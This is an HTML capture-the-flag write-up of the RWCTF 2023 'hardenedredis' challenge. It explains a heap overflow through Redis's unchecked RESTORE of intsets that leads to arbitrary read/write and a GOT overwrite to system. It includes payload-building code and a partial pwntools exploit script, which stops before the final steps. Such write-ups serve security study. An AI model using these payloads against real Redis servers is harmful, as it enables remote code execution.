@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>hardenedredis | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="hardenedredis" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/rwctf-2023/pwn/hardenedredis.html" />
+<meta property="og:url" content="https://org.anize.rs/rwctf-2023/pwn/hardenedredis.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="hardenedredis" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"hardenedredis","url":"https://org.anize.rs/rwctf-2023/pwn/hardenedredis.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="hardenedredis">hardenedredis</h1>
+
+<p>We are given an ubuntu 22.04 docker container, installing the latest redis version.
+Turns out, it is not really the latest redis version, but still with some CVE fixes.
+I scoured through the commit log to find anything interesting and went down a few rabbit holes:</p>
+<ul>
+  <li>Old lua version</li>
+  <li>messagepack lua extension</li>
+  <li>unfixed CVE in lua script execution</li>
+  <li>many many more</li>
+</ul>
+
+<p>After more scouring of the commit log, I realized that the <code class="language-plaintext highlighter-rouge">RESTORE</code> command was fundamentally very broken on the redis version we were given.
+Indeed it was basically not doing any checks at all on the input byte string.
+I first tried to exploit some of the things that were fixed with later commits, but the data structures used were very complex and did not lend themselves to easy heap overflows.
+In the end, I settled on intsets, which look like the following:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">intset</span> <span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">encoding</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>
+    <span class="kt">int8_t</span> <span class="n">contents</span><span class="p">[];</span>
+<span class="p">}</span> <span class="n">intset</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Thanks to the restore commands, I control both the size of the allocated chunk where the intset is stored and its contents.
+I could therefore make the length larger than the actual chunk.
+By then deleting an entry, I would move items outside of the chunk by one to the left, i.e. overwriting things on the heap.
+I used this to corrupt a string and have a string of length <code class="language-plaintext highlighter-rouge">-1</code>.
+Using this string, I then had full arbitrary read/write.
+I then overwrote the free pointer in the got of the cjson load module.
+By making it point to system, I could execute arbitrary commands, by decoding the command as a json string.</p>
+
+<p>The two scripts below showcase the exploit.</p>
+
+<h2 id="coderpy">coder.py</h2>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">pycrc.algorithms</span> <span class="kn">import</span> <span class="n">Crc</span>
+
+
+<span class="k">def</span> <span class="nf">crc64</span><span class="p">(</span><span class="nb">buffer</span><span class="p">):</span>
+    <span class="n">crc_io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s">"./crc"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))])</span>
+    <span class="n">crc_io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+    <span class="n">crc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">crc_io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">crc</span>
+    <span class="c1"># crc = Crc(64, 0xad93d23594c935a9, True, 0xffffffffffffffff, True, 0x0000000000000000)
+</span>    <span class="c1"># return crc.bit_by_bit_fast(buffer)
+</span>
+<span class="k">class</span> <span class="nc">ZipList</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">entry_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">num_entries</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">zlbytes</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">zltail</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">zllen</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">zlend</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">last_off</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">prevlen</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">zlend</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">zlend</span> <span class="o">=</span> <span class="mh">0xff</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">zllen</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">zllen</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">num_entries</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">zltail</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">zltail</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">last_off</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">zlbytes</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">zlbytes</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">entry_data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">11</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">zlbytes</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">zltail</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">zllen</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">entry_data</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">zlend</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">ret</span>
+
+    <span class="k">def</span> <span class="nf">enc_prevlen</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">val</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">val</span> <span class="o">&lt;=</span> <span class="mi">253</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">p8</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xfe</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+
+
+    <span class="k">def</span> <span class="nf">append_entry_raw</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">num_entries</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">enc_prevlen</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">prevlen</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">entry_data</span> <span class="o">+=</span> <span class="n">data</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">last_off</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">prevlen</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">prevlen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">enc_entry</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">my_len</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
+            <span class="n">len_enc</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">my_len</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">len_enc</span> <span class="o">=</span> <span class="n">my_len</span>
+            <span class="k">return</span> <span class="n">p8</span><span class="p">(</span><span class="mb">0b10000000</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">len_enc</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">),</span> <span class="n">val</span>
+
+    <span class="k">def</span> <span class="nf">append_entry</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">my_len</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="n">enc</span><span class="p">,</span> <span class="n">add_len</span><span class="p">,</span> <span class="n">enc_val</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">enc_entry</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">my_len</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">enc</span> <span class="o">+</span> <span class="n">add_len</span> <span class="o">+</span> <span class="n">enc_val</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">append_entry_raw</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">RDB_TYPE_STRING</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">RDB_TYPE_LIST</span> <span class="o">=</span>   <span class="mi">1</span>
+<span class="n">RDB_TYPE_SET</span> <span class="o">=</span>    <span class="mi">2</span>
+<span class="n">RDB_TYPE_ZSET</span> <span class="o">=</span>   <span class="mi">3</span>
+<span class="n">RDB_TYPE_HASH</span> <span class="o">=</span>   <span class="mi">4</span>
+<span class="n">RDB_TYPE_ZSET_2</span> <span class="o">=</span> <span class="mi">5</span>
+<span class="n">RDB_TYPE_MODULE</span> <span class="o">=</span> <span class="mi">6</span>
+<span class="n">RDB_TYPE_MODULE_2</span> <span class="o">=</span> <span class="mi">7</span>
+<span class="n">RDB_TYPE_HASH_ZIPMAP</span> <span class="o">=</span>    <span class="mi">9</span>
+<span class="n">RDB_TYPE_LIST_ZIPLIST</span> <span class="o">=</span>  <span class="mi">10</span>
+<span class="n">RDB_TYPE_SET_INTSET</span> <span class="o">=</span>    <span class="mi">11</span>
+<span class="n">RDB_TYPE_ZSET_ZIPLIST</span> <span class="o">=</span>  <span class="mi">12</span>
+<span class="n">RDB_TYPE_HASH_ZIPLIST</span> <span class="o">=</span>  <span class="mi">13</span>
+<span class="n">RDB_TYPE_LIST_QUICKLIST</span> <span class="o">=</span> <span class="mi">14</span>
+<span class="n">RDB_TYPE_STREAM_LISTPACKS</span> <span class="o">=</span> <span class="mi">15</span>
+
+<span class="k">class</span> <span class="nc">RDB</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">typ</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">entry_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">typ</span> <span class="o">=</span> <span class="n">typ</span>
+
+    <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">p8</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">typ</span><span class="p">)</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">entry_data</span>
+
+    <span class="k">def</span> <span class="nf">append_entry_raw</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">entry_data</span> <span class="o">+=</span> <span class="n">data</span>
+
+    <span class="k">def</span> <span class="nf">append_len</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">len</span><span class="p">):</span>
+        <span class="c1"># TODO: encoded lens
+</span>        <span class="n">len_data</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">len</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">append_entry_raw</span><span class="p">(</span><span class="n">len_data</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">append_bs</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">append_len</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">append_entry_raw</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">intset</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">contents</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">enc</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="n">contents</span>
+
+
+<span class="k">def</span> <span class="nf">encode_dump</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="c1"># TODO: CRC64
+</span>    <span class="n">version</span> <span class="o">=</span> <span class="mi">9</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="n">version</span><span class="p">)</span>
+    <span class="n">crc</span> <span class="o">=</span> <span class="n">crc64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">footer</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">crc</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">data</span> <span class="o">+</span> <span class="n">footer</span>
+
+<span class="k">def</span> <span class="nf">format_escaped</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="n">OBJ_ENCODING_RAW</span> <span class="o">=</span> <span class="mi">0</span>     <span class="c1"># /* Raw representation */
+</span><span class="n">OBJ_ENCODING_INT</span> <span class="o">=</span> <span class="mi">1</span>     <span class="c1"># /* Encoded as integer */
+</span><span class="n">OBJ_ENCODING_HT</span> <span class="o">=</span> <span class="mi">2</span>      <span class="c1"># /* Encoded as hash table */
+</span><span class="n">OBJ_ENCODING_ZIPMAP</span> <span class="o">=</span> <span class="mi">3</span>  <span class="c1"># /* Encoded as zipmap */
+</span><span class="n">OBJ_ENCODING_LINKEDLIST</span> <span class="o">=</span> <span class="mi">4</span> <span class="c1"># /* No longer used: old list encoding. */
+</span><span class="n">OBJ_ENCODING_ZIPLIST</span> <span class="o">=</span> <span class="mi">5</span> <span class="c1"># /* Encoded as ziplist */
+</span><span class="n">OBJ_ENCODING_INTSET</span> <span class="o">=</span> <span class="mi">6</span>  <span class="c1"># /* Encoded as intset */
+</span><span class="n">OBJ_ENCODING_SKIPLIST</span> <span class="o">=</span> <span class="mi">7</span>  <span class="c1"># /* Encoded as skiplist */
+</span><span class="n">OBJ_ENCODING_EMBSTR</span> <span class="o">=</span> <span class="mi">8</span>  <span class="c1"># /* Embedded sds string encoding */
+</span><span class="n">OBJ_ENCODING_QUICKLIST</span> <span class="o">=</span> <span class="mi">9</span> <span class="c1"># /* Encoded as linked list of ziplists */
+</span><span class="n">OBJ_ENCODING_STREAM</span> <span class="o">=</span> <span class="mi">10</span> <span class="c1"># /* Encoded as a radix tree of listpacks */
+</span>
+<span class="n">OBJ_STRING</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1">#    /* String object. */
+</span><span class="n">OBJ_LIST</span> <span class="o">=</span> <span class="mi">1</span> <span class="c1">#      /* List object. */
+</span><span class="n">OBJ_SET</span> <span class="o">=</span> <span class="mi">2</span> <span class="c1">#       /* Set object. */
+</span><span class="n">OBJ_ZSET</span> <span class="o">=</span> <span class="mi">3</span> <span class="c1">#      /* Sorted set object. */
+</span><span class="n">OBJ_HASH</span> <span class="o">=</span> <span class="mi">4</span> <span class="c1">#      /* Hash object. */
+</span>
+<span class="n">SDS_TYPE_5</span> <span class="o">=</span>  <span class="mi">0</span>
+<span class="n">SDS_TYPE_8</span> <span class="o">=</span>  <span class="mi">1</span>
+<span class="n">SDS_TYPE_16</span> <span class="o">=</span> <span class="mi">2</span>
+<span class="n">SDS_TYPE_32</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">SDS_TYPE_64</span> <span class="o">=</span> <span class="mi">4</span>
+
+<span class="c1"># z = ZipList()
+# z.append_entry(b"lmao\0", 0x1000)
+# # print(z.entry_data)
+# # z.append_entry(b"meme")
+</span>
+<span class="c1"># final_pay = z.encode()
+</span>
+<span class="c1"># print("ZIPLISt:")
+# print(hexdump(final_pay))
+</span>
+<span class="c1"># r = RDB(RDB_TYPE_LIST_QUICKLIST)
+# r.append_len(1)
+# r.append_bs(final_pay)
+# rdb_pay = r.encode()
+# dumped = encode_dump(rdb_pay)
+</span>
+<span class="c1"># print(f"restore asdf 0 \"{format_escaped(dumped)}\"")
+</span>
+<span class="c1"># myis = intset(10, b"\0"*0x38)
+# r = RDB(RDB_TYPE_SET_INTSET)
+# r.append_bs(myis)
+# dumped = encode_dump(r.encode())
+</span>
+<span class="c1"># print(f"restore lmao 0 \"{format_escaped(dumped)}\"")
+</span>
+<span class="c1"># print(format_escaped(z.encode()))
+</span></code></pre></div></div>
+
+<h2 id="exploitpy">exploit.py</h2>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host 47.88.50.1 --port 9999 redis-6.0.16/redis-server
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">coder</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">redis</span>
+
+<span class="c1"># Set up pwntools for the correct architecture
+</span><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'redis-6.0.16/redis-server'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"tmux"</span><span class="p">,</span> <span class="s">"split"</span><span class="p">,</span> <span class="s">"-h"</span><span class="p">]</span>
+
+<span class="c1"># Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+</span><span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s">'47.88.50.1'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">9999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start_local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Execute the target binary locally'''</span>
+    <span class="c1"># cleanup old db
+</span>    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm -rf /var/lib/redis/dump.rdb"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start_remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Connect to the process on the remote host'''</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="s">"./redis.conf"</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">start_local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">start_remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="c1"># Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+set substitute-path /build/redis-6i8WL9/ /home/vagrant/CTF/rwctf/
+# b scanGenericCommand
+# b lookupStringForBitCommand
+# b bitops.c:580
+# b readQueryFromClient
+b system
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+# FORTIFY:  Enabled
+</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">rem_port</span> <span class="o">=</span> <span class="mi">6379</span>
+<span class="n">r_host</span> <span class="o">=</span> <span class="s">"10.10.20.1"</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"token now:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"GpBQe0iTSLeTuaXxfmtf/A=="</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Now your new port is :"</span><span class="p">)</span>
